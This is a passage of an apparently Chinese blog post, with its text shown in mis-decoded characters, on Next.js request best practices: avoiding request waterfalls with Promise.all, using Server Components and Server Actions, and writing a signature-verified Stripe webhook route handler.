itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js è¯·æ±‚æœ€ä½³å®è·µ - vercel 2026ä¸€æœˆå‘å¸ƒæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3389172758899188/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å´å°˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:41:42.000Z" title="Mon Feb 09 2026 08:41:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½ æ‰“å¼€å•†å“è¯¦æƒ…é¡µï¼Œè½¬äº† 3 ç§’èŠèŠ±æ‰çœ‹åˆ°å†…å®¹â€”â€”æ…¢åœ¨å“ªï¼Ÿ</p>
<p>ä½ ç‚¹ä¸ª"åŠ è´­ç‰©è½¦"ï¼Œé¡µé¢å¡äº†ä¸€ä¸‹æ‰ååº”â€”â€”åˆæ…¢åœ¨å“ªï¼Ÿ</p>
<p>ä½ åŠ äº†å‡ ä¸ªåŠŸèƒ½ï¼Œæ•´ä¸ªç«™è¶Šæ¥è¶Šè‚¥ï¼Œé¦–å±ç™½å¾—è®©äººä»¥ä¸ºæ–­ç½‘äº†â€”â€”è¿˜æ˜¯æ…¢åœ¨å“ª?</p>
<p>å¤§éƒ¨åˆ†äººçš„ç¬¬ä¸€ååº”æ˜¯ï¼šè‚¯å®šæ˜¯ä»£ç å†™å¾—ä¸å¤Ÿä¼˜é›…ï¼Œèµ¶ç´§ <code>useMemo</code>ã€<code>useCallback</code> ä¸€æŠŠæ¢­ã€‚</p>
<p><strong>é”™äº†ã€‚</strong></p>
<p>çœŸæ­£æŠŠä½ æ‹–å®çš„ï¼Œå¾€å¾€ä¸æ˜¯"ç»„ä»¶é‡æ¸²æŸ“äº† 2 æ¬¡è¿˜æ˜¯ 3 æ¬¡"ï¼Œè€Œæ˜¯ä¸¤åº§æ›´è‡´å‘½çš„å¤§å±±ï¼š</p>
<ul>
<li><strong>è¯·æ±‚ç€‘å¸ƒ</strong>ï¼šæœ¬æ¥èƒ½å¹¶è¡Œçš„è¯·æ±‚ï¼Œè¢«ä½ å†™æˆäº†ä¸²è¡Œï¼Œç”¨æˆ·ç™½ç­‰ 600ms èµ·æ­¥</li>
<li><strong>å®¢æˆ·ç«¯å±å±±</strong>ï¼šæœ¬æ¥èƒ½åœ¨æœåŠ¡ç«¯å¹²çš„æ´»ï¼Œå…¨å¡å®¢æˆ·ç«¯ï¼Œæ¯ä¸ªé¡µé¢å¤šèƒŒ 300KB JS</li>
</ul>
<p>Vercel æŠŠè¿™äº‹å„¿è¯´å¾—å¾ˆç›´ç™½ï¼š<strong>ä½ ä¼˜åŒ–çš„é¡ºåºé”™äº†ï¼Œå†æ€ä¹ˆæŠ ç»†èŠ‚éƒ½æ˜¯ç™½å¹²ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-0">å…ˆçœ‹ä¸¤ä¸ªè¦å‘½çš„æ•°å­—</h2>
<h3 data-id="heading-1">æ•°å­— 1ï¼šä¸€ä¸ªç€‘å¸ƒ = ç™½ç­‰ 600ms</h3>
<p>ä»€ä¹ˆå«"è¯·æ±‚ç€‘å¸ƒ"ï¼Ÿçœ‹è¿™æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>()      <span class="hljs-comment">// ç­‰ 200ms</span>
  <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchProduct</span>() <span class="hljs-comment">// åˆç­‰ 200ms  </span>
  <span class="hljs-keyword">const</span> inventory = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchInventory</span>() <span class="hljs-comment">// å†ç­‰ 200ms</span>
}
</code></pre>
<p>è¿™ä¸‰ä¸ªè¯·æ±‚æ˜æ˜äº’ä¸ä¾èµ–ï¼Œç»“æœä½ æ„£æ˜¯è®©ç”¨æˆ·ç­‰äº† 600msã€‚æ”¹æˆå¹¶è¡Œå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> [user, product, inventory] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  <span class="hljs-title function_">fetchUser</span>(),
  <span class="hljs-title function_">fetchProduct</span>(), 
  <span class="hljs-title function_">fetchInventory</span>()
])
<span class="hljs-comment">// æ€»å…±åªç­‰ 200ms</span>
</code></pre>
<p><strong>çœäº† 400msï¼Œæ¯”ä½ ä¼˜åŒ–ä¸€ç™¾ä¸ª useMemo éƒ½ç®¡ç”¨ã€‚</strong></p>
<p>è¿˜æœ‰æ›´éªšçš„æ“ä½œï¼šä½ çš„ä»£ç å…ˆ <code>await fetchUserData()</code>ï¼Œä½†åé¢æŸä¸ªåˆ†æ”¯æ ¹æœ¬ç”¨ä¸åˆ°è¿™æ•°æ®â€”â€”ç»“æœä¸ç®¡èµ°ä¸èµ°é‚£ä¸ªåˆ†æ”¯ï¼Œéƒ½å¾—å…ˆç­‰å®Œè¿™ä¸ªè¯·æ±‚ã€‚ç™½ç­‰çš„å…¸èŒƒã€‚</p>
<h3 data-id="heading-2">æ•°å­— 2ï¼šæ¯é¡µå¤šèƒŒ 300KB = é•¿æœŸç¨</h3>
<p>ä½ ä»Šå¤©ä¸ºäº†"æ–¹ä¾¿"ï¼ŒæŠŠæ•°æ®è¯·æ±‚ã€çŠ¶æ€ç®¡ç†ã€ç¬¬ä¸‰æ–¹åº“å…¨å¡å®¢æˆ·ç«¯ã€‚çˆ½æ˜¯çˆ½äº†ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p><strong>æ¯ä¸ªç”¨æˆ·æ¯æ¬¡è®¿é—®ï¼Œéƒ½è¦ä¸‹è½½è¿™ 300KB çš„ JSï¼Œè§£æå®ƒï¼Œæ‰§è¡Œå®ƒã€‚</strong></p>
<p>è¿™ä¸æ˜¯ä¸€æ¬¡æ€§æˆæœ¬ï¼Œè¿™æ˜¯"é•¿æœŸç¨"â€”â€”ä½ å†™ä¸€æ¬¡ï¼Œæ‰€æœ‰ç”¨æˆ·æ°¸è¿œä¹°å•ï¼Œç›´åˆ°æœ‰äººå—ä¸äº†æ¥é‡æ„ã€‚</p>
<p><strong>æ˜ç¡®ä¸€ç‚¹ï¼šVercel æŠŠè¿™ä¸¤ä»¶äº‹æ’åœ¨æ‰€æœ‰æ€§èƒ½ä¼˜åŒ–çš„æœ€å‰é¢ï¼Œæ ‡æ³¨ä¸º CRITICALã€‚</strong></p>
<p>ä»€ä¹ˆ useMemoã€ç»„ä»¶æ‹†åˆ†ã€è™šæ‹Ÿæ»šåŠ¨â€”â€”éƒ½å¾—å¾€åç¨ç¨ã€‚å› ä¸ºä½ ç€‘å¸ƒå¤š 600msï¼Œç”¨æˆ·æ ¹æœ¬æ´»ä¸åˆ°çœ‹ä½ "ä¼˜é›…çš„é‡æ¸²æŸ“æ§åˆ¶"ã€‚</p>
<h2 data-id="heading-3">è¯·æ±‚é€‰å‹</h2>
<p>åˆ«ç®¡ä»€ä¹ˆ RSCã€Server Componentã€Server Action è¿™äº›åè¯å“äººã€‚ä½ åªéœ€è¦è®°ä½ï¼š<strong>é‡åˆ°åœºæ™¯ï¼Œå…ˆé—®ä¸¤å¥è¯ã€‚</strong></p>
<p><strong>ç¬¬ä¸€é—®ï¼šè¿™ä¹ˆå¹²ä¼šä¸ä¼šè®©ç”¨æˆ·ç™½ç­‰ï¼ˆåˆ¶é€ ç€‘å¸ƒï¼‰ï¼Ÿ</strong><br/>
<strong>ç¬¬äºŒé—®ï¼šè¿™ä¹ˆå¹²ä¼šä¸ä¼šè®©åŒ…ä½“è¶Šæ»šè¶Šå¤§ï¼ˆå…»é•¿æœŸç¨ï¼‰ï¼Ÿ</strong></p>
<p>ä¸¤ä¸ªéƒ½ä¸ä¼šï¼Ÿé‚£æ‰è½®åˆ°ä½ èŠåˆ«çš„ç»†èŠ‚ã€‚</p>
<h3 data-id="heading-4">åœºæ™¯ 1ï¼šæ‰“å¼€é¡µé¢å°±è¦æ•°æ® â†’ ç”¨ RSC</h3>
<p><strong>å…¸å‹éœ€æ±‚ï¼š</strong> å•†å“è¯¦æƒ…é¡µã€åˆ—è¡¨é¡µã€ä»ªè¡¨ç›˜</p>
<p>ç”¨æ¥é¢„é˜²æ•°æ®åœ¨å®¢æˆ·ç«¯ä¸€å±‚å±‚è§¦å‘ï¼Œå½¢æˆç­‰å¾…é“¾ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âŒ é”™è¯¯ç¤ºèŒƒï¼ˆå®¢æˆ·ç«¯ç€‘å¸ƒï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> [product, setProduct] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>)
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetchUser</span>().<span class="hljs-title function_">then</span>(setUser)  <span class="hljs-comment">// å…ˆç­‰è¿™ä¸ª</span>
  }, [])
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (user) {
      <span class="hljs-title function_">fetchProduct</span>(user.<span class="hljs-property">id</span>).<span class="hljs-title function_">then</span>(setProduct) <span class="hljs-comment">// å†ç­‰è¿™ä¸ª</span>
    }
  }, [user])
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}
</code></pre>
<p>è¿™ä»£ç æ¯ä¸€è¡Œéƒ½åœ¨å–Š"æˆ‘åœ¨åˆ¶é€ ç€‘å¸ƒ"ã€‚</p>
<p><strong>æ­£ç¡®å§¿åŠ¿ï¼šRSC åœ¨æœåŠ¡ç«¯å¹¶è¡Œæ‹¿æ•°æ®</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âœ… app/products/[id]/page.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductPage</span>(<span class="hljs-params">{ params }</span>) {
  <span class="hljs-comment">// å¹¶è¡Œå‘èµ·ï¼Œä¸€èµ·ç­‰</span>
  <span class="hljs-keyword">const</span> [user, product, inventory] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
    <span class="hljs-title function_">getUser</span>(),
    <span class="hljs-title function_">getProduct</span>(params.<span class="hljs-property">id</span>),
    <span class="hljs-title function_">getInventory</span>(params.<span class="hljs-property">id</span>)
  ])
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductDetail</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> <span class="hljs-attr">product</span>=<span class="hljs-string">{product}</span> <span class="hljs-attr">inventory</span>=<span class="hljs-string">{inventory}</span> /&gt;</span></span>
}
</code></pre>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong> èƒ½å¹¶è¡Œå°±å¹¶è¡Œï¼Œåˆ«è®©æœåŠ¡ç«¯ä¹Ÿå†™å‡ºç€‘å¸ƒã€‚æ•°æ®æ‹¿é½äº†å†æ¸²æŸ“ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°çš„å°±æ˜¯å¸¦æ•°æ®çš„ HTMLã€‚</p>
<h3 data-id="heading-5">åœºæ™¯ 2ï¼šç”¨æˆ·ç‚¹æŒ‰é’®è¦å†™æ•°æ® â†’ ç”¨ Server Action</h3>
<p><strong>å…¸å‹éœ€æ±‚ï¼š</strong> åŠ è´­ç‰©è½¦ã€æäº¤è¡¨å•ã€ç‚¹èµã€åˆ é™¤</p>
<p>æœç»æŠŠä¸€æ¬¡å†™æ“ä½œæ‹†æˆå¤šæ®µï¼šå†™å®Œæ‹‰æ•°æ®ã€æ‹‰å®Œç®—çŠ¶æ€ã€ç®—å®Œå†æ¸²æŸ“â€¦â€¦</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âŒ é”™è¯¯ç¤ºèŒƒï¼ˆå®¢æˆ·ç«¯æ‹‰é•¿ç­‰å¾…é“¾ï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleAddCart</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/cart'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>, ... }) <span class="hljs-comment">// ç­‰</span>
  <span class="hljs-keyword">const</span> newCart = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/cart'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">json</span>()) <span class="hljs-comment">// åˆç­‰</span>
  <span class="hljs-title function_">setCart</span>(newCart) <span class="hljs-comment">// çŠ¶æ€æ›´æ–°</span>
  toast.<span class="hljs-title function_">success</span>(<span class="hljs-string">'å·²åŠ å…¥è´­ç‰©è½¦'</span>) <span class="hljs-comment">// æœ€åæ‰æç¤º</span>
}
</code></pre>
<p><strong>æ­£ç¡®å§¿åŠ¿ï¼šServer Action ä¸€æŠŠæ¢­</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âœ… app/products/actions.ts</span>
<span class="hljs-string">'use server'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">addToCart</span>(<span class="hljs-params">productId: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCurrentUser</span>()
  
  <span class="hljs-comment">// å¹¶è¡Œï¼šå†™åº“ + æŸ¥åº“å­˜</span>
  <span class="hljs-keyword">const</span> [cart, stock] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
    db.<span class="hljs-property">cart</span>.<span class="hljs-title function_">create</span>({ <span class="hljs-attr">userId</span>: user.<span class="hljs-property">id</span>, productId }),
    db.<span class="hljs-property">inventory</span>.<span class="hljs-title function_">findUnique</span>({ <span class="hljs-attr">where</span>: { productId } })
  ])
  
  <span class="hljs-title function_">revalidatePath</span>(<span class="hljs-string">'/cart'</span>)  <span class="hljs-comment">// åˆ·æ–°ç›¸å…³é¡µé¢</span>
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">stock</span>: stock.<span class="hljs-property">quantity</span> }
}
</code></pre>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âœ… Client Component é‡Œç›´æ¥è°ƒ</span>
<span class="hljs-string">'use client'</span>
<span class="hljs-keyword">import</span> { addToCart } <span class="hljs-keyword">from</span> <span class="hljs-string">'./actions'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">AddToCartButton</span>(<span class="hljs-params">{ productId }</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{async</span> () =&gt;</span> {
      const result = await addToCart(productId)
      toast.success(`å·²åŠ å…¥ï¼å‰©ä½™ ${result.stock} ä»¶`)
    }}&gt;
      åŠ å…¥è´­ç‰©è½¦
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  )
}
</code></pre>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong> Server Action å°±æ˜¯"ç»„ä»¶å†…çš„æœåŠ¡ç«¯å…¥å£"ã€‚è¯¥å¹¶è¡Œå¹¶è¡Œï¼Œå†™å®Œç›´æ¥ <code>revalidatePath</code> åˆ·æ–°ï¼Œåˆ«è®©å®¢æˆ·ç«¯å†å‘ä¸€åœˆè¯·æ±‚ã€‚</p>
<h3 data-id="heading-6">åœºæ™¯ 3ï¼šå¤–éƒ¨ç³»ç»Ÿè¦æ‰“ä½  â†’ ç”¨ Route Handler (app/api)</h3>
<p><strong>å…¸å‹éœ€æ±‚ï¼š</strong> Stripe webhookã€GitHub å›è°ƒã€ç»™ App æä¾› API</p>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ Actionï¼Ÿ</strong> å› ä¸ºå¤–éƒ¨ç³»ç»Ÿä¸è®¤ä½ çš„ç»„ä»¶æ ‘ï¼Œå®ƒåªè®¤ä¸€ä¸ª HTTP URLã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âœ… app/api/webhooks/stripe/route.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">req: Request</span>) {
  <span class="hljs-keyword">const</span> signature = req.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'stripe-signature'</span>)
  
  <span class="hljs-comment">// éªŒç­¾</span>
  <span class="hljs-keyword">const</span> event = stripe.<span class="hljs-property">webhooks</span>.<span class="hljs-title function_">constructEvent</span>(
    <span class="hljs-keyword">await</span> req.<span class="hljs-title function_">text</span>(),
    signature,
    process.<span class="hljs-property">env</span>.<span class="hljs-property">STRIPE_WEBHOOK_SECRET</span>
  )
  
  <span class="hljs-comment">// å¹¶è¡Œï¼šå†™åº“ + è§¦å‘å‘è´§</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
    db.<span class="hljs-property">order</span>.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: event.<span class="hljs-property">data</span>.<span class="hljs-property">object</span>.<span class="hljs-property">metadata</span>.<span class="hljs-property">orderId</span> }, <span class="hljs-attr">data</span>: { <span class="hljs-attr">status</span>: <span class="hljs-string">'paid'</span> } }),
    <span class="hljs-title function_">triggerShipment</span>(event.<span class="hljs-property">data</span>.<span class="hljs-property">object</span>.<span class="hljs-property">metadata</span>.<span class="hljs-property">orderId</span>)
  ])
  
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Response</span>.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">received</span>: <span class="hljs-literal">true</span> })
}
</code></pre>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong> Route Handler = å¯¹å¤–çš„ HTTP è¾¹ç•Œã€‚ä½†å†…éƒ¨é€»è¾‘ç…§æ ·è¦ç ç€‘å¸ƒã€æ§åŒ…ä½“ã€‚</p>
<h2 data-id="heading-7">æœ€å®¹æ˜“è¸©çš„å‘ï¼šServer Action é‡Œç»•åœˆæ‰“è‡ªå·±çš„ API</h2>
<p>å¾ˆå¤šäººä¼šå†™æˆè¿™æ ·ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âŒ å¤šæ­¤ä¸€ä¸¾</span>
<span class="hljs-string">'use server'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">data</span>) {
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'http://localhost:3000/api/orders'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
